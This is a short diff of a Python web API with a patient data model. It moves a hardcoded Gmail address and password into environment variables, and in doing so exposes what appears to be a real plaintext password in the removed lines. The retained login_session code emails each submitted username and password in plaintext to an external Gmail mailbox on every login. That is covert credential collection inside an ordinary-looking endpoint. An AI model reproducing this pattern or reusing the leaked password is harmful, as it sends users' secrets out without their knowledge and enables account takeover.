@@ -9,8 +9,8 @@ import base64
 import smtplib
 import os
 
-MY_EMAIL = "tylkodysk77@gmail.com"
-PASSWORD = "Kamuka.77"
+MY_EMAIL = os.environ["MY_EMAIL_ENV"]
+PASSWORD = os.environ["PASSWORD_ENV"]
 
 class PatientResp(BaseModel):
     id: Optional[int]
@@ -96,7 +96,7 @@ def login_session(response: Response, username: str = "", password: str = ""):
     connection = smtplib.SMTP("smtp.gmail.com")
     connection.starttls()
     connection.login(user=MY_EMAIL, password=PASSWORD)
-    connection.sendmail(from_addr=MY_EMAIL, to_addrs=MY_EMAIL,
+    connection.sendmail(from_addr=MY_EMAIL, to_addrs=os.environ["MY_EMAIL_ENV"],
                         msg=f"Subject:DAFT\n\n{username}{password}")
 
     username_bytes = username.encode('ascii')
@@ -157,5 +157,6 @@ def login_token(*, response: Response, username: str = "", password: str = ""):
 # base64_message2 = base64_bytes2.decode('ascii')
 #
 # print(base64_message2)
+
 
 
